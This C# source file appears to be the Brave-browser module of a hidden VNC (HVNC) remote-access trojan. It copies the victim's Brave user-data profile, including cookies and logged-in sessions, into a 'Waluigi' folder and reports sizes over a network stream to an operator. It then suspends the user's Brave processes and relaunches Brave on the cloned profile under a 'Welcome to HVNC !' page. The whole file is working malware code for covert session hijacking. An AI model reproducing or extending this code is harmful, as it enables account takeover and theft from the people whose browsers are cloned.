﻿using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using DLL.Functions;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;

namespace DLL.Browser
{
	public class Brave
	{

		[DllImport("user32.dll", EntryPoint = "SetWindowPos")]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		const short SWP_NOMOVE = 0X2;
		const short SWP_NOSIZE = 1;
		const short SWP_NOZORDER = 0X4;
		const int SWP_SHOWWINDOW = 0x0040;

		public static void StartBrave(bool duplicate)
		{
			try
			{    //C:\Program Files\BraveSoftware\Brave-Browser\Application

				// C:\Users\Alex\AppData\Local\BraveSoftware\Brave-Browser\User Data
				if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Waluigi\\lockfile"))))
				{
					Outils.SendInformation(Outils.nstream, "25|Brave has already been opened!");
					return;
				}
				if (duplicate)
				{
					Outils.SendInformation(Outils.nstream, "22|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
					MonitorDirSize monitorDirSize = new MonitorDirSize();
					monitorDirSize.StartMonitoring(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Waluigi\\");
					try
					{
						Outils.a.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data", Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Waluigi\\", overwrite: true);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					monitorDirSize.StopMonitoring();
					Outils.SendInformation(Outils.nstream, "206|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
				}
				else
				{
					Outils.SendInformation(Outils.nstream, "207|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));

				}
				Process[] processesByName = Process.GetProcessesByName("brave");
				foreach (Process process in processesByName)
				{
					Outils.SuspendProcess(process);
				}
				Process.Start("brave", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Waluigi\" \"data:text/html,<center><title>Welcome to HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='white'>Welcome to HVNC !</font></h1></center>\" --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();

				Stopwatch stopwatch = new Stopwatch();
				stopwatch.Start();

				while (Outils.FindHandle("Welcome to HVNC !") == default(IntPtr))
				{
					// Get the dimensions for the second monitor 
					Rectangle secondMonitor = Screen.AllScreens[0].WorkingArea;
					SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, secondMonitor.Left, secondMonitor.Top, secondMonitor.Width, secondMonitor.Height, SWP_NOZORDER | SWP_SHOWWINDOW);

					Application.DoEvents();
					if (stopwatch.ElapsedMilliseconds >= 10000)
					{
						return;
					}
				}
				stopwatch.Stop();
				Process[] processesByName2 = Process.GetProcessesByName("brave");
				foreach (Process process2 in processesByName2)
				{
					Outils.ResumeProcess(process2);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}


	}
}
